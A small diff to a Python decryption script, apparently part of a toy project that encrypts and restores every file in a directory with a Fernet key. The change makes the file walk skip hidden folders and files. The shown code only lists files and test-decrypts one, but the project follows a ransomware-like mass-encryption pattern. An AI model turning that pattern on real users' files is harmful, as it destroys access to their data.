@@ -10,13 +10,16 @@ from tkinter import messagebox
 All_files = []
 
 for root, dirs, files in os.walk("."):
-    for file in files:
-        path = os.path.join(root,file)
-        dirs[:] = [d for d in dirs if d != ".git"]
-        
-        if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
-            continue
-        All_files.append(path)
+    dirs[:] = [d for d in dirs if not d.startswith(".")]
+
+    visible_file = [f for f in files if not f.startswith(".")]
+
+    for thefile in visible_file:
+            path = os.path.join(root,thefile)
+            
+            if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
+                continue
+            All_files.append(path)
 
 print(All_files)
 
@@ -27,6 +30,7 @@ with open("key.key", "rb") as f:
 
 with open("hello.txt", "rb") as f:
     content = f.read()
+
 
 try:
     Fernet(key).decrypt(content)
